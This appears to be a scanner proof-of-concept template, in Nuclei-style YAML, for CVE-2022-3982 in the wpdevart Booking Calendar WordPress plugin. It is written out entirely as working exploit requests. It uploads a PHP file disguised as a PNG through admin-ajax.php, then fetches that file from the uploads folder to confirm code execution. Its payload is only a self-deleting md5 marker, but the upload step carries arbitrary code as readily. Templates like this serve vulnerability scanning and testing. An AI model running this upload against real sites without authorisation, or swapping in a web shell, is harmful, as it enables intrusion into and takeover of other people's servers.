id: yaml-poc-wpdevart-booking_calendar-logical-CVE-2022-3982
info:
  name: Yaml Poc Wpdevart Booking_Calendar Logical Cve 2022 3982
  author: jiapeng.han
  severity: critical
  description: 'Converted from xpoc: yaml-poc-wpdevart-booking_calendar-logical-CVE-2022-3982'
  tags: cve
  classification:
    cve-id: CVE-2022-3982
  reference:
  - https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867
http:
- method: GET
  path:
  - /
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /wp-admin/admin-ajax.php?action=wpdevart_form_ajax
  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
    \ name=\"wpdevart_id\"\r\n\nx\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
    \ form-data; name=\"wpdevart_nonce\"\r\n\n{{token}}\r\n------WebKitFormBoundary{{rboundary}}\r\
    \nContent-Disposition: form-data; name=\"wpdevart-submit\"\r\n\n1\r\n------WebKitFormBoundary{{rboundary}}\r\
    \nContent-Disposition: form-data; name=\"wpdevart_data\"\r\n\n{\"wpdevart-submit\"\
    :\"X\"}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
    \ name=\"file\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/png\r\n\r\
    \n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
    \n"
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /wp-content/uploads/booking_calendar/{{randname}}.php
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
